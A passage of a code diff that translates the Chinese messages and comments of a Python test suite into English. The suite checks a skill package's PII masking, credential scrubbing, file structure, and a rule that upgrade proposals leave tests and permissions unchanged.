+        self.assertEqual([], missed, f"credential names were not scrubbed (H-2 recurrence): {missed}")
+        # Reverse check: harmless variables must not be wiped too, or the child process cannot work
         benign = [
             "PATH", "HOME", "LANG", "TERM", "USER", "TMP", "TEMP", "SYSTEMROOT",
             "COMSPEC", "PROGRAMFILES", "APPDATA", "PYTHONPATH", "VIRTUAL_ENV",
@@ -705,10 +705,10 @@ class BehaviorTests(unittest.TestCase):
             "PATHEXT", "OS", "EDITOR",
         ]
         over = [n for n in benign if is_secret(n)]
-        self.assertEqual([], over, f"无害变量被误擦除: {over}")
+        self.assertEqual([], over, f"harmless variables were wrongly scrubbed: {over}")
 
     def test_mask_phone_number_variants(self):
-        """★ M-2：手机号不得只覆盖「连续 11 位」一种写法。"""
+        """★ M-2: phone masking must not cover only the '11 consecutive digits' form."""
         fn = self._fn("mask_sensitive_data")
         variants = [
             "13800138000", "+8613800138000", "138-0013-8000",
@@ -718,26 +718,26 @@ class BehaviorTests(unittest.TestCase):
             out = fn(f"call {raw} now")
             self.assertEqual(
                 "call [PHONE] now", out,
-                f"手机号写法 {raw!r} 未被完整脱敏（M-2 复发）: {out!r}",
+                f"phone form {raw!r} was not fully masked (M-2 recurrence): {out!r}",
             )
 
     def test_execute_safe_command_non_utf8_output_not_lost(self):
-        """★ M-4：非 UTF-8 输出不得静默变成 None（中文 Windows 默认 GBK 必现）。"""
+        """★ M-4: non-UTF-8 output must not silently become None (always the case on Chinese Windows with GBK)."""
         fn = self._fn("execute_safe_command")
-        # 0xB2 是 UTF-8 非法起始字节（GBK 中文首字节的典型取值）。必须写裸字节：
-        # 用 ASCII 文本做探针不会触发解码失败，断言就成了永远通过的空断言。
+        # 0xB2 is an invalid UTF-8 start byte (a typical first byte of GBK Chinese). Raw bytes are required:
+        # an ASCII probe never triggers a decode failure, so the assertion would be permanently vacuous.
         code = "import sys; sys.stdout.buffer.write(bytes([0xB2, 0x41, 0x42]))"
         try:
             res = fn([sys.executable, "-c", code], timeout=30)
-        except Exception as exc:  # noqa: BLE001 —— 命令形态不可用时跳过
-            self.skipTest(f"无法执行探针命令: {exc!r}")
+        except Exception as exc:  # noqa: BLE001 — skip when no command shape is usable
+            self.skipTest(f"cannot run the probe command: {exc!r}")
             return
         out = res.get("stdout") if isinstance(res, dict) else getattr(res, "stdout", None)
-        self.assertIsNotNone(out, "非 UTF-8 输出静默丢失（M-4 复发）: stdout=None")
-        self.assertNotEqual("", out, "非 UTF-8 输出被丢弃为空串（M-4 复发）")
+        self.assertIsNotNone(out, "non-UTF-8 output silently lost (M-4 recurrence): stdout=None")
+        self.assertNotEqual("", out, "non-UTF-8 output was dropped to an empty string (M-4 recurrence)")
 
     def test_format_output_json_model_field(self):
-        """★ L-4：model 字段须为 <provider/model>，不得重复追加 /default。"""
+        """★ L-4: the model field must be <provider/model> and must not append /default twice."""
         fn = self._fn("format_output_json")
 
         def model_of(res):
@@ -756,34 +756,34 @@ class BehaviorTests(unittest.TestCase):
             return data.get("model") if isinstance(data, dict) else None
 
         self.assertEqual("openai/gpt-4", model_of(fn("x", "openai/gpt-4")),
-                         "provider 含 /model 时被错误追加 /default（L-4 复发）")
+                         "provider containing /model was wrongly given an extra /default (L-4 recurrence)")
         self.assertEqual("acme/default", model_of(fn("x", "acme")),
-                         "provider 不含 /model 时应补 /default")
+                         "provider without /model should get /default appended")
 
     def test_check_rate_limit_memory_bounded(self):
-        """★ L-3：identifier 数量必须有上界，长期运行不得无界增长。"""
+        """★ L-3: the number of identifiers must be bounded; a long run must not grow without bound."""
         fn = self._fn("check_rate_limit")
         cap = self.ns.get("_MAX_RATE_IDENTIFIERS")
         buckets = self.ns.get("_rate_buckets")
         if not isinstance(cap, int) or not hasattr(buckets, "__len__"):
             self.fail(
-                "权威源未声明限流器上界（L-3 回归）：删除被守护的符号不得让断言 skip"
+                "the authoritative source declares no rate-limiter bound (L-3 recurrence): deleting a guarded symbol must not skip the assertion"
             )
         for _ in range(cap + 500):
             fn("bounded-" + uuid.uuid4().hex, limit=10, window=60)
         self.assertLessEqual(
             len(buckets), cap,
-            f"限流器 identifier 数量超出上界（L-3 复发）: {len(buckets)} > {cap}",
+            f"the number of rate-limiter identifiers exceeds the bound (L-3 recurrence): {len(buckets)} > {cap}",
         )
 
     def test_read_reference_file_fails_closed_without_root(self):
-        """★ L-6：{SKILL_DIR} 未配置时须拒绝读取，不得退回当前工作目录。"""
+        """★ L-6: with {SKILL_DIR} unset, reading must be refused, not fall back to the current working directory."""
         fn = self._fn("read_reference_file")
         flag = "SKILL_ROOT_CONFIGURED"
         if flag not in self.ns:
             self.fail(
-                "权威源未声明 SKILL_ROOT_CONFIGURED（L-6 fail-closed 回归）："
-                "删除被守护的符号不得让断言 skip"
+                "the authoritative source declares no SKILL_ROOT_CONFIGURED (L-6 fail-closed recurrence):"
+                "deleting a guarded symbol must not skip the assertion"
             )
         saved = self.ns[flag]
         self.ns[flag] = False
@@ -795,39 +795,39 @@ class BehaviorTests(unittest.TestCase):
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# B. 源文件完整性测试（关键：防契约/代码/测试三者脱节）
+# B. Source integrity tests (key: keep contract/code/tests from drifting apart)
 # ═════════════════════════════════════════════════════════════════════════════
 class SourceIntegrityTests(unittest.TestCase):
-    """断言权威模板源存在且完整——测试测的是源文件，不是内联副本。"""
+    """Assert the authoritative template source exists and is complete — the test tests the source file, not an inline copy."""
 
     def test_templates_source_exists(self):
-        """断言权威模板文件存在且含全部 10 个函数定义"""
+        """Assert the authoritative template file exists and contains all 10 function definitions"""
         src = SKILL_DIR / AUTHORITATIVE_SOURCE
-        self.assertTrue(src.exists(), f"模板权威源缺失: {src}")
+        self.assertTrue(src.exists(), f"authoritative template source missing: {src}")
         content = src.read_text(encoding="utf-8")
         for fn_name in TEN_TEMPLATE_NAMES:
             self.assertIn(f"def {fn_name}", content,
-                          f"模板 {fn_name} 在权威源中缺失")
+                          f"template {fn_name} is missing from the authoritative source")
 
     def test_phone_masking_in_source(self):
-        """断言权威源含 PHONE 实现——防止契约/代码/测试三者脱节"""
+        """Assert the authoritative source contains the PHONE implementation — keeps contract/code/tests from drifting apart"""
         src = SKILL_DIR / AUTHORITATIVE_SOURCE
-        self.assertTrue(src.exists(), f"模板权威源缺失: {src}")
+        self.assertTrue(src.exists(), f"authoritative template source missing: {src}")
         content = src.read_text(encoding="utf-8")
-        self.assertIn("[PHONE]", content, "权威源缺失 PHONE 脱敏实现")
+        self.assertIn("[PHONE]", content, "the authoritative source is missing the PHONE masking implementation")
 
     def test_legacy_templates_file_absent(self):
-        """★ R3 新增：断言已取消的 templates.md 不存在，防止双权威源"""
+        """★ R3 addition: assert the cancelled templates.md does not exist, preventing a dual authoritative source"""
         legacy = SKILL_DIR / LEGACY_TEMPLATES_FILE
-        self.assertFalse(legacy.exists(), "templates.md 已取消（R3-2），不得生成")
+        self.assertFalse(legacy.exists(), "templates.md was cancelled (R3-2) and must not be generated")
 
     def test_def_unique_across_package(self):
-        """★ R4 新增：断言全包每个 `def <fn>` 恰 1 处（P10/P44 复发信号）。
+        """★ R4 addition: assert every def <fn> appears exactly once across the package (P10/P44 recurrence signal).
 
-        §7.3 的验收要求"全包每个 def 恰 1 处命中"。此前该检查只靠人工 grep，
-        导致 README-FOR-AI.md §7.1 内联复制 mask_sensitive_data 而未被发现。
-        两条防线并存：权威源"含"10 个 def（test_templates_source_exists）+
-        全包"仅"1 处（本断言），后者才能守住单一权威源。
+        §7.3 requires every def to appear exactly once package-wide. This check used to rely on a manual grep,
+        which let README-FOR-AI.md §7.1 inline-copy mask_sensitive_data unnoticed.
+        Two lines of defence coexist: the authoritative source contains the 10 defs (test_templates_source_exists),
+        and this only-once assertion — only the latter guards the single authoritative source.
         """
         # Scan the PACKAGE FILE SET, never the whole working tree. Repository
         # tooling directories (.workbuddy/, .github/, .skill-upgrade/) hold local
@@ -850,11 +850,11 @@ class SourceIntegrityTests(unittest.TestCase):
         duplicated = {name: sorted(locs) for name, locs in hits.items() if len(locs) > 1}
         self.assertEqual(
             {}, duplicated,
-            "模板代码被内联复制到多处（P10/P44）：" +
+            "template code was inlined in multiple places (P10/P44): " +
             "; ".join(f"{name} -> {locs}" for name, locs in sorted(duplicated.items()))
         )
 
-        # 权威源必须覆盖全部 10 个模板，且不允许任何一处落到权威源之外。
+        # The authoritative source must cover all 10 templates, and none may land outside it.
         authoritative = AUTHORITATIVE_SOURCE
         outside = {
             name: sorted(locs)
@@ -863,20 +863,20 @@ class SourceIntegrityTests(unittest.TestCase):
         }
         self.assertEqual(
             {}, outside,
-            f"模板函数必须只出现在 {authoritative}（P10/P44）：{outside}"
+            f"template functions must appear only in {authoritative} (P10/P44): {outside}"
         )
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# C. 结构一致性测试
+# C. Structural consistency tests
 # ═════════════════════════════════════════════════════════════════════════════
 class StructureTests(unittest.TestCase):
-    """micro 档结构不变量：职能块守恒、升级四件套、治理文件、prompts 约束。"""
+    """micro-tier structural invariants: function-block conservation, the four scaling files, governance files, prompt constraints."""
 
     def test_function_block_conservation(self):
-        """断言职能块总数守恒：micro/small/medium/large=18，group=36"""
+        """Assert total function-block conservation: micro/small/medium/large=18, group=36"""
         dept_dir = SKILL_DIR / "references" / "departments"
-        self.assertTrue(dept_dir.exists(), f"部门目录缺失: {dept_dir}")
+        self.assertTrue(dept_dir.exists(), f"department directory missing: {dept_dir}")
         actual = {}
         total = 0
         for f in sorted(dept_dir.glob("*.md")):
@@ -886,63 +886,63 @@ class StructureTests(unittest.TestCase):
             total += n
         self.assertEqual(
             total, EXPECTED_FB_TOTAL,
-            f"{SCALE_TIER} 档职能块总数应为 {EXPECTED_FB_TOTAL}，实际 {total}（合并档位丢失职能）",
+            f"the {SCALE_TIER} tier must have {EXPECTED_FB_TOTAL} function blocks, found {total} (a merged tier dropped functions)",
         )
         self.assertEqual(
             actual, EXPECTED_DEPARTMENT_BLOCKS,
-            f"各部门职能块数与 {SCALE_TIER} 档规格不符: {actual}",
+            f"per-department function blocks do not match the {SCALE_TIER} tier spec: {actual}",
         )
 
     def test_scaling_files_present(self):
-        """断言自我升级四件套齐全且 policy 为 propose-only"""
+        """Assert the four self-scaling files are present and the policy is propose-only"""
         for p in ["references/scaling.md", ".scaling-state.json",
                   "scripts/self-scale.ps1", "scripts/scaling-config.json"]:
-            self.assertTrue((SKILL_DIR / p).exists(), f"升级机制缺失: {p}")
+            self.assertTrue((SKILL_DIR / p).exists(), f"scaling mechanism file missing: {p}")
         cfg = json.loads(
             (SKILL_DIR / "scripts" / "scaling-config.json").read_text(encoding="utf-8")
         )
         self.assertEqual(cfg.get("upgrade_policy"), "propose-only",
-                         "upgrade_policy 只能为 propose-only（P36）")
+                         "upgrade_policy can only be propose-only (P36)")
 
     def test_governance_files_present(self):
-        """★ R3-7（12→13）：断言 13 个治理与社区文件全档位齐备，文件名逐字符一致"""
+        """★ R3-7 (12 to 13): assert all 13 governance and community files exist at every tier, with exact filename case"""
         actual_names = {f.name for f in SKILL_DIR.iterdir()}
         for name in GOVERNANCE_FILES:
             p = SKILL_DIR / name
-            self.assertTrue(p.exists(), f"治理文件缺失: {name}")
-            self.assertTrue(p.is_file(), f"治理文件不是普通文件: {name}")
+            self.assertTrue(p.exists(), f"governance file missing: {name}")
+            self.assertTrue(p.is_file(), f"governance file is not a regular file: {name}")
             self.assertIn(name, actual_names,
-                          f"文件名大小写须与规格一致: {name}")
+                          f"filename case must match the spec exactly: {name}")
 
     def test_no_filename_with_space(self):
-        """★ R3-7：断言无文件名含空格（防 'CODE OF CONDUCT.md'）"""
+        """★ R3-7: assert no filename contains a space (guards against 'CODE OF CONDUCT.md')"""
         # Same package-file-set basis as test_def_unique_across_package: a
         # scratch copy under .workbuddy/ is not package content (§3).
         for rel in package_relative_paths():
-            self.assertNotIn(" ", Path(rel).name, f"文件名含空格: {rel}")
+            self.assertNotIn(" ", Path(rel).name, f"filename contains a space: {rel}")
 
     def test_prompt_modes_declared(self):
-        """★ R3-3：断言每个 prompt 声明 mode，且 01/02 为 human-paste"""
+        """★ R3-3: assert every prompt declares mode, and 01/02 are human-paste"""
         prompts = sorted((SKILL_DIR / "prompts").glob("*.md"))
-        self.assertTrue(prompts, "prompts/ 目录为空或缺目录")
+        self.assertTrue(prompts, "prompts/ is empty or the directory is missing")
         for f in prompts:
             head = f.read_text(encoding="utf-8")[:400]
             self.assertRegex(head, r"mode:\s*(human-paste|agent-invoked)",
-                             f"{f.name} 未声明 mode")
+                             f"{f.name} does not declare mode")
         for n in ["01-implement-method.md", "02-robustness-checks.md"]:
             head = (SKILL_DIR / "prompts" / n).read_text(encoding="utf-8")[:400]
-            self.assertIn("mode: human-paste", head, f"{n} 必须为 human-paste")
+            self.assertIn("mode: human-paste", head, f"{n} must be human-paste")
 
     def test_human_paste_prompts_self_contained(self):
-        """★ R3-3：断言 human-paste prompt 不含内部路径与写死语言（H1/H2/H6）"""
+        """★ R3-3: assert a human-paste prompt contains no internal paths and no hardwired language (H1/H2/H6)"""
         for f in (SKILL_DIR / "prompts").glob("*.md"):
             content = f.read_text(encoding="utf-8")
             if "mode: human-paste" not in content[:400]:
                 continue
-            # H1 禁内部路径（references/ prompts/ scripts/ {SKILL_DIR} SKILL.md
-            # method-patterns）；H2 禁内部标识符（部门 slug、错误码、FB-N、WFT-NNN）；
-            # H6 禁写死输出语言。原名单只查了 4 项，未来把 method-patterns 或
-            # 错误码抄进 prompt 也能通过。
+            # H1 forbids internal paths (references/ prompts/ scripts/ {SKILL_DIR} SKILL.md
+            # method-patterns); H2 forbids internal identifiers (department slugs, error codes, FB-N, WFT-NNN);
+            # H6 forbids a hardwired output language. The old list checked only 4 items, so copying method-patterns
+            # or an error code into a prompt would still pass.
             for bad in [
                 "references/", "prompts/", "scripts/", "{SKILL_DIR}",
                 "SKILL.md", "method-patterns",
@@ -950,53 +950,53 @@ class StructureTests(unittest.TestCase):
                 "CEO_", "CTO_", "SCL_", "FB-", "WFT-",
                 "All content in English",
             ]:
-                self.assertNotIn(bad, content, f"{f.name} 违反自包含约束: {bad}")
+                self.assertNotIn(bad, content, f"{f.name} violates the self-containment constraint: {bad}")
 
-            # H3：自包含还要求背景内联——10 个模板签名、3 个 PII 占位符、AIGC 三层
-            # 标识都必须自带。此前断言只查"没有什么"，不查"该有什么"，于是 02 号
-            # prompt 只列鲁棒性维度、没有签名清单也能通过。
+            # H3: self-containment also requires inline background — the 10 template signatures, the 3 PII placeholders
+            # and the three AIGC labelling elements must all be carried. The old assertion checked only what must not
+            # appear, never what must appear, so prompt 02 could pass with only robustness dimensions and no signature list.
             for sig in TEN_TEMPLATE_SIGNATURES:
-                self.assertIn(sig, content, f"{f.name} 缺少 H3 内联签名: {sig}")
+                self.assertIn(sig, content, f"{f.name} is missing the H3 inline signature: {sig}")
             for ph in ("[EMAIL]", "[IP]", "[PHONE]"):
-                self.assertIn(ph, content, f"{f.name} 缺少 H3 PII 占位符: {ph}")
+                self.assertIn(ph, content, f"{f.name} is missing the H3 PII placeholder: {ph}")
             for layer in ("AI-Generated Content", "ai_generated", "generated_at"):
-                self.assertIn(layer, content, f"{f.name} 缺少 H3 AIGC 标识要素: {layer}")
+                self.assertIn(layer, content, f"{f.name} is missing the H3 AIGC element: {layer}")
 
     def test_language_policy_declared(self):
-        """★ R3-4：断言 frontmatter 含 language_policy 且取值正确（四字段）"""
+        """★ R3-4: assert the frontmatter carries language_policy with the correct values (four fields)"""
         skill_md = SKILL_DIR / "SKILL.md"
-        self.assertTrue(skill_md.exists(), "SKILL.md 缺失")
+        self.assertTrue(skill_md.exists(), "SKILL.md missing")
         fm = parse_frontmatter(skill_md)
         lp = fm.get("language_policy")
-        self.assertIsInstance(lp, dict, "frontmatter 缺少 language_policy 块")
+        self.assertIsInstance(lp, dict, "the frontmatter is missing the language_policy block")
         self.assertEqual(str(lp.get("authoring")), "en")
         self.assertEqual(str(lp.get("encoding")), "utf-8")
         self.assertEqual(str(lp.get("output")), "user-specified")
         self.assertEqual(str(lp.get("fallback")), "en")
 
     def test_skill_md_is_index_only(self):
-        """★ R3-1：断言 SKILL.md 正文 ≤120 行且不含代码实现与完整错误码表"""
+        """★ R3-1: assert the SKILL.md body is <= 120 lines, with no code implementation and no full error-code table"""
         skill_md = SKILL_DIR / "SKILL.md"
-        self.assertTrue(skill_md.exists(), "SKILL.md 缺失")
+        self.assertTrue(skill_md.exists(), "SKILL.md missing")
         text = skill_md.read_text(encoding="utf-8")
         parts = text.split("---", 2)
-        self.assertGreaterEqual(len(parts), 3, "SKILL.md 缺少 frontmatter")
+        self.assertGreaterEqual(len(parts), 3, "SKILL.md is missing its frontmatter")
         body = parts[2]
-        self.assertLessEqual(len(body.splitlines()), 120, "SKILL.md 正文超 120 行")
+        self.assertLessEqual(len(body.splitlines()), 120, "the SKILL.md body exceeds 120 lines")
         self.assertFalse(re.search(r"(?m)^def ", body),
-                         "SKILL.md 不得含代码实现")
+                         "SKILL.md must not contain a code implementation")
         self.assertFalse(re.search(r"\| *[A-Z]{2,5}_\d{3}", body),
-                         "SKILL.md 不得含具体错误码表")
+                         "SKILL.md must not contain a concrete error-code table")
 
     def test_metadata_consistency(self):
-        """断言 frontmatter 元数据与 micro 档参数一致（版本 1.0.0、档位、部门数、职能块数）"""
+        """Assert frontmatter metadata matches the micro-tier parameters (version 1.0.0, tier, department count, block count)"""
         skill_md = SKILL_DIR / "SKILL.md"
-        self.assertTrue(skill_md.exists(), "SKILL.md 缺失")
+        self.assertTrue(skill_md.exists(), "SKILL.md missing")
         fm = parse_frontmatter(skill_md)
         self.assertEqual(str(fm.get("version")), SKILL_VERSION,
-                         f"版本号应为 {SKILL_VERSION}")
+                         f"the version should be {SKILL_VERSION}")
         metadata = fm.get("metadata")
-        self.assertIsInstance(metadata, dict, "frontmatter 缺少 metadata 块")
+        self.assertIsInstance(metadata, dict, "the frontmatter is missing the metadata block")
         self.assertEqual(str(metadata.get("scale_tier")), SCALE_TIER)
         self.assertEqual(str(metadata.get("department_count")),
                          str(len(EXPECTED_DEPARTMENT_BLOCKS)))
@@ -1005,50 +1005,50 @@ class StructureTests(unittest.TestCase):
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# D. 不可变边界测试（升级安全的关键）
+# D. Immutable-boundary tests (the key to upgrade safety)
 # ═════════════════════════════════════════════════════════════════════════════
 class ImmutableBoundaryTests(unittest.TestCase):
-    """升级提案包不得自我豁免（改 tests/）或自我提权（改 permissions）。"""
+    """An upgrade package must not self-exempt (change tests/) or self-escalate (change permissions)."""
 
     def test_upgrade_package_excludes_immutable(self):
-        """扫描 {WORKSPACE_ROOT}/.skill-upgrade/ 下所有提案包，
-        断言其中不含 tests/ 变更、不含 permissions 块变更"""
+        """Scan every proposal package under {WORKSPACE_ROOT}/.skill-upgrade/ and
+        assert it contains no tests/ change and no permissions-block change"""
         upgrade_root = WORKSPACE_ROOT / ".skill-upgrade"
         if not upgrade_root.exists():
-            self.skipTest(f"暂无升级提案包（{upgrade_root} 不存在）")
+            self.skipTest(f"no upgrade proposal package yet ({upgrade_root} does not exist)")
         packages = [p for p in sorted(upgrade_root.iterdir()) if p.is_dir()]
         if not packages:
-            self.skipTest(".skill-upgrade/ 下无提案包目录")
+            self.skipTest("no proposal package directory under .skill-upgrade/")
         for pkg in packages:
             files = [f.relative_to(pkg).as_posix() for f in pkg.rglob("*")]
             self.assertFalse(
                 any(f == "tests" or f.startswith("tests/") for f in files),
-                f"升级包试图修改测试（自我豁免）: {pkg}",
+                f"the upgrade package tries to modify tests (self-exemption): {pkg}",
             )
             skill_md = pkg / "SKILL.md"
             if skill_md.exists():
                 new_perm = extract_permissions_block(skill_md)
                 self.assertEqual(
                     new_perm, BASELINE_PERMISSIONS,
-                    f"升级包试图修改权限（自我提权）: {pkg}",
+                    f"the upgrade package tries to modify permissions (self-escalation): {pkg}",
                 )
 
 
 # ═════════════════════════════════════════════════════════════════════════════
-# ★ 2026-10-14 初审回归防线（H-1..H-4 / M-1..M-4）
+# ★ 2026-10-14 initial-review regression line (H-1..H-4 / M-1..M-4)
 #
-# 初审的教训：31 条断言全绿、13 个治理文件齐备、每条红线都打了勾，机制却是坏的。
-# 这些断言因此只测"机制是否真的跑起来"，不核对文档措辞。每条都做过注回缺陷的
-# 反向验证：把缺陷写回临时副本后，对应断言必须失败。
+# Lesson from the initial review: 31 assertions all green, 13 governance files present, every red line ticked,
+# yet the mechanism was broken. These assertions therefore test only whether the mechanism actually runs, not wording.
+# Each was negative-verified: after writing the defect back into a throwaway copy, the assertion must fail.
 # ═════════════════════════════════════════════════════════════════════════════
 class InitialReview20261014Tests(unittest.TestCase):
-    """初审高危/中危缺陷的机器防线。"""
+    """Machine guard for the high/medium defects found in the initial review."""
 
     def _run_self_scale(self, script, action, extra=None, timeout=180):
-        """在子进程中运行 self-scale.ps1，返回 CompletedProcess。"""
+        """Run self-scale.ps1 in a subprocess and return the CompletedProcess."""
         exe = shutil.which("powershell") or shutil.which("pwsh")
         if exe is None:
-            self.skipTest("未找到 powershell/pwsh；跳过脚本冒烟断言")
+            self.skipTest("no powershell/pwsh found; skipping the script smoke assertion")
         cmd = [exe, "-ExecutionPolicy", "Bypass", "-File", str(script), "-Action", action]
         if extra:
             cmd.extend(extra)
@@ -1058,11 +1058,11 @@ class InitialReview20261014Tests(unittest.TestCase):
         )
 
     def _temp_workspace(self):
-        """创建一个可写的工作区目录。
+        """Create a writable workspace directory.
 
-        不用 tempfile.TemporaryDirectory()：它创建的 0700 目录在本机沙箱下
-        会拒绝在其中再建子目录/再清理（WinError 5）。改为在系统临时目录下
-        自建唯一目录，失败时退回 .workbuddy/（已被包文件集排除）。
+        Not tempfile.TemporaryDirectory(): the 0700 directory it creates makes this host's sandbox
+        refuse subdirectories/cleanup inside it (WinError 5). Instead a unique directory is created
+        under the system temp dir, falling back to .workbuddy/ (already excluded from the package file set).
         """
         base = Path(tempfile.gettempdir())
         for _ in range(20):
@@ -1079,7 +1079,7 @@ class InitialReview20261014Tests(unittest.TestCase):
         return fallback
 
     def _clean_copy(self, dest):
-        """把包文件集复制到 dest（临时工作区内），保持相对结构。"""
+        """Copy the package file set into dest (inside a temp workspace), preserving the relative structure."""
         dest = Path(dest)
         for rel in package_relative_paths():
             target = dest / rel
@@ -1087,41 +1087,41 @@ class InitialReview20261014Tests(unittest.TestCase):
             shutil.copy2(SKILL_DIR / rel, target)
         return dest
 
-    # ── H-1 / H-3：包文件集必须与三兄弟结构树逐路径一致 ──────────────────────
+    # ── H-1 / H-3: the package file set must match the three-sibling structure tree path by path ──
     def test_package_file_set_matches_declared_count(self):
-        """★ H-1/H-3：包文件集 = 26，且 README 三兄弟结构树逐路径一致。"""
+        """★ H-1/H-3: the package file set = 26 and the three README siblings' trees match it path by path."""
         declared = set(package_relative_paths())
         self.assertEqual(
             26, len(declared),
-            f"包文件集应为 26，实测 {len(declared)}：{sorted(declared)}",
+            f"the package file set should be 26, found {len(declared)}: {sorted(declared)}",
         )
         for doc in ("README.md", "README.en.md", "README.zh.md"):
             tree = set(readme_tree_paths(doc))
             self.assertEqual(
                 declared, tree,
-                f"{doc} 结构树与包文件集不一致："
-                f"磁盘有/树里没有={sorted(declared - tree)}，"
-                f"树里有/磁盘没有={sorted(tree - declared)}",
+                f"{doc} structure tree does not match the package file set: "
+                f"on disk but not in the tree={sorted(declared - tree)}, "
+                f"in the tree but not on disk={sorted(tree - declared)}",
             )
         blocks = []
         for doc in ("README.md", "README.en.md", "README.zh.md"):
             text = (SKILL_DIR / doc).read_text(encoding="utf-8")
             blocks.append(re.search(r"```text\n(.*?)```", text, re.S).group(1))
-        self.assertEqual(blocks[0], blocks[1], "README.en.md 与 README.md 结构树不同")
-        self.assertEqual(blocks[0], blocks[2], "README.zh.md 与 README.md 结构树不同")
+        self.assertEqual(blocks[0], blocks[1], "README.en.md and README.md trees differ")
+        self.assertEqual(blocks[0], blocks[2], "README.zh.md and README.md trees differ")
 
-    # ── H-1：升级包不得携带仓库工具目录 ─────────────────────────────────────
+    # ── H-1: the upgrade package must not carry repository tooling directories ────────────────────
     def test_upgrade_package_excludes_repo_tooling(self):
-        """★ H-1：.git//.workbuddy//.github/ 绝不进入升级包（无包则 skip）。"""
+        """★ H-1: .git//.workbuddy//.github/ never enter the upgrade package (skip when no package exists)."""
         upgrade_root = WORKSPACE_ROOT / ".skill-upgrade"
         if not upgrade_root.exists():
-            self.skipTest(f"暂无升级提案包（{upgrade_root} 不存在）")
+            self.skipTest(f"no upgrade proposal package yet ({upgrade_root} does not exist)")
         packages = [
             p for p in sorted(upgrade_root.rglob("*"))
             if p.is_dir() and (p / "SKILL.md").exists()
         ]
         if not packages:
-            self.skipTest(".skill-upgrade/ 下无提案包目录")
+            self.skipTest("no proposal package directory under .skill-upgrade/")
         for pkg in packages:
             leaks = []
             for f in pkg.rglob("*"):
@@ -1132,12 +1132,12 @@ class InitialReview20261014Tests(unittest.TestCase):
                     leaks.append(rel)
             self.assertEqual(
                 [], leaks,
-                f"升级包携带了非包内容（H-1 发布包泄漏）: {pkg}: {leaks[:5]}",
+                f"the upgrade package carries non-package content (H-1 release leak): {pkg}: {leaks[:5]}",
             )
 
-    # ── H-1 / H-4：本条纵贯线一次抓住全部 propose 缺陷 ───────────────────────
+    # ── H-1 / H-4: this end-to-end line catches every propose defect at once ─────────────────────
     def test_propose_smoke_on_clean_copy(self):
-        """★ H-1/H-4：纯净副本内 propose 必须 exit 0 且 G1-G6 全 PASSED。"""
+        """★ H-1/H-4: a clean-copy propose must exit 0 with G1-G6 all PASSED."""
         workspace = self._temp_workspace()
         self.addCleanup(shutil.rmtree, workspace, ignore_errors=True)
         pkg = self._clean_copy(workspace / "ai-company")
@@ -1145,18 +1145,18 @@ class InitialReview20261014Tests(unittest.TestCase):
         combined = (proc.stdout or "") + "\n" + (proc.stderr or "")
         self.assertEqual(
             0, proc.returncode,
-            f"纯净副本 propose 应 exit 0，实际 {proc.returncode}：\n{combined[-3000:]}",
+            f"clean-copy propose should exit 0, got {proc.returncode}:\n{combined[-3000:]}",
         )
         for gate in ("G1", "G2", "G3", "G4", "G5", "G6"):
             self.assertIn(f"{gate} PASSED", combined,
-                          f"{gate} 未通过：\n{combined[-3000:]}")
+                          f"{gate} did not pass:\n{combined[-3000:]}")
         proposals = list((workspace / ".skill-upgrade").rglob("UPGRADE-PROPOSAL.md"))
-        self.assertEqual(1, len(proposals), "未生成 UPGRADE-PROPOSAL.md")
+        self.assertEqual(1, len(proposals), "no UPGRADE-PROPOSAL.md was generated")
 
-        # 复审 B1/H-5：拆分页必须改成自己的显示名与自己的职能块数。
-        # 此前 $preamble.Replace($src, $t.Slug) 是空操作（preamble 里是显示名，
-        # 不是 slug），五个拆分页全部沿用 legacy 标题与 8/10 的计数，而 G4 只数
-        # '## FB-N:' 标题，照样 PASSED。
+        # Recheck B1/H-5: a split page must take its own display name and its own block count.
+        # The old $preamble.Replace($src, $t.Slug) was a no-op (the preamble carries the display name,
+        # not the slug), so all five split pages kept the legacy title and the 8/10 count, while G4 counted
+        # only '## FB-N:' headings and still PASSED.
         pkg_dir = proposals[0].parent
         expected = {
             "governance-and-operations": ("Governance and Operations", 6),
@@ -1168,30 +1168,30 @@ class InitialReview20261014Tests(unittest.TestCase):
         actual_slugs = set()
         for f in sorted((pkg_dir / "references" / "departments").glob("*.md")):
             actual_slugs.add(f.stem)
-            self.assertIn(f.stem, expected, f"生成了多余的部门页: {f.name}")
+            self.assertIn(f.stem, expected, f"generated an extra department page: {f.name}")
             title, blocks = expected[f.stem]
             head = f.read_text(encoding="utf-8").splitlines()
             self.assertEqual(
                 f"# {title}", head[0].strip(),
-                f"{f.name} 未改写为本部门标题（沿用 legacy 标题）",
+                f"{f.name} did not take its own department title (legacy title retained)",
             )
             self.assertIn(
                 f"Function blocks: {blocks}.", head[2],
-                f"{f.name} 的 Function blocks 声明未随拆分改写（§10.2 守恒基准）",
+                f"{f.name}'s Function blocks declaration was not rewritten with the split (§10.2 conservation basis)",
             )
         self.assertEqual(
             set(expected), actual_slugs,
-            f"拆分页集合不完整: {sorted(set(expected) - actual_slugs)}",
+            f"the split-page set is incomplete: {sorted(set(expected) - actual_slugs)}",
         )
         tree = (pkg_dir / "README.md").read_text(encoding="utf-8")
         self.assertIn(
             "```text\nai-company/", tree,
-            "生成的 README 结构树根目录不是包名 ai-company/",
+            "the generated README structure tree root is not the package name ai-company/",
         )
 
-    # ── M-2：顶层 validation 块（§12.6 强制的字段） ──────────────────────────
+    # ── M-2: the top-level validation block (fields required by §12.6) ───────────────────────────
     def test_scaling_state_schema_complete(self):
-        """★ M-2：状态文件顶层必需字段齐备，validation.gates_passed == 6。"""
+        """★ M-2: the state file has every required top-level field, validation.gates_passed == 6."""
         state = json.loads((SKILL_DIR / ".scaling-state.json").read_text(encoding="utf-8"))
         required = {
             "schema_version", "current_tier", "tier_history", "pending_proposals",
@@ -1200,18 +1200,18 @@ class InitialReview20261014Tests(unittest.TestCase):
         }
         self.assertTrue(
             required <= set(state),
-            f"状态文件缺字段：{sorted(required - set(state))}",
+            f"the state file is missing fields: {sorted(required - set(state))}",
         )
         validation = state["validation"]
         self.assertEqual(6, validation.get("gates_passed"),
-                         "validation.gates_passed 必须 = 6")
+                         "validation.gates_passed must = 6")
         self.assertEqual(26, validation.get("file_count"),
-                         "micro 档 validation.file_count 应为 26")
+                         "micro-tier validation.file_count should be 26")
         self.assertIn("acceptance_passed", validation)
 
-    # ── M-1：必须读 bytes，read_text() 会掩盖 CRLF ───────────────────────────
+    # ── M-1: must read bytes; read_text() hides CRLF ─────────────────────────────────────────────
